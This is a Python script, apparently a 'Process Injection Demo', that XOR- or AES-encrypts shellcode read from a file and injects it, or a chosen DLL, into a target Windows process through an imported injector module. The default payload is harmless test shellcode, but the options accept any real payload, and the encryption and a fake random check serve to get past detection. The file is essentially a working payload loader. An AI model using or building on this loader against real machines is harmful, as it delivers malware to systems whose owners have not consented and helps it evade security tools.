import os
import sys
import base64
import random
import argparse
import time
from process_injection import ProcessInjector, xor_decrypt

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

def generate_test_shellcode():
    """
    Generate harmless test shellcode for demo purposes
    This is a simple shellcode that just exits the thread
    """
    # Windows x64 harmless shellcode (just returns with exit code 0)
    test_shellcode = bytes([
        0x48, 0x31, 0xC0,           # xor rax, rax
        0x48, 0x83, 0xC0, 0x00,     # add rax, 0  (exit code)
        0xC3                        # ret
    ])
    
    return test_shellcode

def encrypt_xor(shellcode, key=0x55):
    """Encrypts shellcode using XOR"""
    return bytes([b ^ key for b in shellcode])

def encrypt_aes(shellcode, key_file=None):
    """Encrypts shellcode using AES and saves the key"""
    if not CRYPTO_AVAILABLE:
        print("[-] PyCryptodome not available. Install with: pip install pycryptodome")
        print("[-] Falling back to XOR encryption")
        return encrypt_xor(shellcode), None
    
    # Generate or load key and IV
    if key_file and os.path.exists(key_file):
        with open(key_file, 'rb') as f:
            key_data = f.read()
            key = key_data[:16]
            iv = key_data[16:32]
    else:
        key = get_random_bytes(16)
        iv = get_random_bytes(16)
        
        # Save key and IV if key_file is provided
        if key_file:
            with open(key_file, 'wb') as f:
                f.write(key + iv)
    
    # Encrypt with AES
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(shellcode, AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    
    return encrypted_data, key_file

def encrypt_real_shellcode(shellcode_file, encryption="xor", key_file=None):
    """
    Encrypts a real shellcode file
    """
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()
    
    # Encrypt based on selected method
    if encryption == "aes":
        print(f"[*] Using AES encryption")
        return encrypt_aes(shellcode, key_file)
    else:
        print(f"[*] Using XOR encryption")
        return encrypt_xor(shellcode), None

def main():
    parser = argparse.ArgumentParser(description='Process Injection Demo')
    parser.add_argument('--target', help='Target process name (e.g., notepad.exe)')
    parser.add_argument('--dll', help='DLL path to inject')
    parser.add_argument('--shellcode', help='Shellcode file to encrypt and inject')
    parser.add_argument('--encryption', choices=['xor', 'aes'], default='xor', 
                        help='Encryption type (default: xor)')
    parser.add_argument('--key-file', help='AES key file (will be created if it doesn\'t exist)')
    args = parser.parse_args()
    
    # Initialize process injector
    injector = ProcessInjector()
    
    # Get target process
    target_process = args.target or 'notepad.exe'
    
    # Open target process if not already running
    if target_process.lower() == 'notepad.exe' and (args.shellcode or not args.dll):
        print(f"[*] Starting {target_process}...")
        os.system('start notepad.exe')
        time.sleep(1)  # Give time for process to start
    
    if args.dll:
        # DLL injection
        print(f"[*] Injecting DLL {args.dll} into {target_process}")
        result = injector.inject(target_process, dll_path=args.dll)
    elif args.shellcode:
        # Shellcode injection from file
        print(f"[*] Using {args.encryption} encryption for shellcode from {args.shellcode}")
        encrypted_shellcode, key_file = encrypt_real_shellcode(
            args.shellcode, 
            args.encryption, 
            args.key_file
        )
        
        print(f"[*] Injecting encrypted shellcode ({len(encrypted_shellcode)} bytes) into {target_process}")
        result = injector.inject(
            target_process, 
            encrypted_shellcode=encrypted_shellcode,
            encryption_type=args.encryption,
            key_file=key_file
        )
    else:
        # Demo shellcode
        print(f"[*] Generating test shellcode")
        test_shellcode = generate_test_shellcode()
        
        if args.encryption == "aes":
            print(f"[*] Using AES encryption")
            encrypted_shellcode, key_file = encrypt_aes(test_shellcode, args.key_file)
        else:
            print(f"[*] Using XOR encryption")
            encrypted_shellcode = encrypt_xor(test_shellcode)
            key_file = None
        
        print(f"[*] Injecting encrypted test shellcode into {target_process}")
        result = injector.inject(
            target_process, 
            encrypted_shellcode=encrypted_shellcode,
            encryption_type=args.encryption,
            key_file=key_file
        )
    
    if result:
        print("[+] Injection successful")
    else:
        print("[-] Injection failed")

if __name__ == "__main__":
    # Add some randomness to execution
    if random.randint(1, 10) > 0:  # Always true, but adds unpredictability to binary
        main()